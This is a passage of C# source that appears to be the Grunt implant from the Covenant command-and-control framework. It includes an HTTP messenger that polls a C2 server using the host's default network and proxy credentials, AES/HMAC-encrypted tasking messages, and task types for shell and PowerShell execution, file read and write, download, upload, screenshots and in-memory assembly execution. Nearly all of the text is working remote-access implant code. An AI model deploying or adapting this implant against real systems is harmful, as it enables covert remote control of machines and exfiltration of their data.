            {
                try
                {
                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                }
                catch (Exception) { }
            }
            finally
            {
                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
                {
                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
                    try
                    {
                        GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;
                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);
                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                    }
                    catch (Exception) {}
                }
            }
        }

        private static string[] SplitArgs(string args)
        {
            List<string> result = new List<string>();
            bool inQuotes = false;
            string current = "";
            foreach (char c in args)
            {
                if (c == '"') { inQuotes = !inQuotes; }
                else if (c == ' ' && !inQuotes) { if (current.Length > 0) { result.Add(current); current = ""; } }
                else { current += c; }
            }
            if (current.Length > 0) { result.Add(current); }
            return result.ToArray();
        }
    }

    public enum MessageType
    {
        Read,
        Write
    }

    public class ProfileMessage
    {
        public MessageType Type { get; set; }
        public string Message { get; set; }
    }

    public class MessageEventArgs : EventArgs
    {
        public string Message { get; set; }
    }

    public interface IMessenger
    {
        string Hostname { get; }
        string Identifier { get; set; }
        string Authenticator { get; set; }
        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        ProfileMessage Read();
        void Write(string Message);
        void Close();
    }

    public class Profile
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profile(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }

        private static GruntEncryptedMessage Parse(string Format, string Message)
        {
            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GruntEncryptedMessage.FromJson(json);
        }

        private static string Format(string Format, GruntEncryptedMessage Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        private IMessenger UpstreamMessenger { get; set; }
        private object _MessageQueueLock = new object();
        private Queue<string> MessageQueue { get; } = new Queue<string>();

        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
                this.QueueTaskingMessage(e.Message);
                this.WriteTaskingMessage();
            };
        }

        public GruntTaskingMessage ReadTaskingMessage()
        {
            ProfileMessage readMessage = null;
            lock (_UpstreamLock)
            {
                readMessage = this.UpstreamMessenger.Read();
            }
            if (readMessage == null)
            {
                return null;
            }
            GruntEncryptedMessage gruntMessage = null;
            if (readMessage.Type == MessageType.Read) 
            {
                gruntMessage = this.Profile.ParseGetResponse(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                gruntMessage = this.Profile.ParsePostResponse(readMessage.Message);
            }
            if (gruntMessage == null)
            {
                return null;
            }
            else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                if (relay != null)
                {
                    // TODO: why does this need to be PostResponse?
                    relay.Write(this.Profile.FormatGetResponse(wrappedMessage));
                }
                return null;
            }
        }

        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
            lock (_MessageQueueLock)
            {
                this.MessageQueue.Enqueue(uploaded);
            }
        }

        public void WriteTaskingMessage()
        {
            try
            {
                lock (_UpstreamLock)
                {
                    lock (_MessageQueueLock)
                    {
                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
                    }
                }
            }
            catch (InvalidOperationException) {}
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            return false;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

    public class HttpMessenger : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }

        private string CovenantURI { get; }
        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }

        private bool UseCertPinning { get; set; }
        private bool ValidateCert { get; set; }

        private Queue<ProfileMessage> ToReadQueue { get; } = new Queue<ProfileMessage>();

        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
        {
            this.CovenantURI = CovenantURI;
            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (this.UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && this.ValidateCert)
                {
                    valid = errors == System.Net.Security.SslPolicyErrors.None;
                }
                return valid;
            };
        }

        public ProfileMessage Read()
        {
            if (this.ToReadQueue.Any())
            {
                return this.ToReadQueue.Dequeue();
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return new ProfileMessage { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
                if (ToReadMessage.Message != "")
                {
                    this.ToReadQueue.Enqueue(ToReadMessage);
                }
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                if (ProfileHttpHeaderNames[i] == "Cookie")
                {
                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
                }
                else
                {
                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                }
            }
        }
    }

    public class MessageCrafter
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessageCrafter(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public GruntEncryptedMessage Create(string Message, string Meta = "")
        {
            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
        }

        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GruntEncryptedMessage message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class CookieWebClient : WebClient
    {
        private CookieContainer CookieContainer { get; }
        public CookieWebClient()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void SetCookies(Uri uri, string cookies)
        {
            this.CookieContainer.SetCookies(uri, cookies);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum GruntTaskingType
    {
        SetDelay,
        SetJitter,
        SetConnectAttempts,
        SetKillDate,
        Exit,
        Connect,
        Disconnect,
        Tasks,
        TaskKill,
        Shell,
        ShellCmd,
        PowerShell,
        WhoAmI,
        Pwd,
        Cd,
        ListDirectory,
        ReadFile,
        WriteFile,
        GetHostname,
        ProcessList,
        Kill,
        CreateDirectory,
        Delete,
        Copy,
        Download,
        Upload,
        Screenshot,
        ExecuteAssembly
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
            if (parseList.Count < 3) { return null; }
            return new GruntTaskingMessage
            {
                Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public enum GruntTaskingStatus
    {
        Uninitialized,
        Tasked,
        Progressed,
        Completed,
        Aborted
    }

    public class GruntTaskingMessageResponse
    {
        public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)
        {
            Status = status;
            Output = output;
        }
        public GruntTaskingStatus Status { get; set; }
        public string Output { get; set; }

        private static string GruntTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
        public string ToJson()
        {
            return String.Format(
                GruntTaskingMessageResponseFormat,
                this.Status.ToString("D"),
                Utilities.JavaScriptStringEncode(this.Output)
            );
        }
    }

    public class GruntEncryptedMessage
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

        public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
        public string IV { get; set; } = "";
        public string EncryptedMessage { get; set; } = "";
        public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
            if (parseList.Count < 5) { return null; }
            return new GruntEncryptedMessage
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}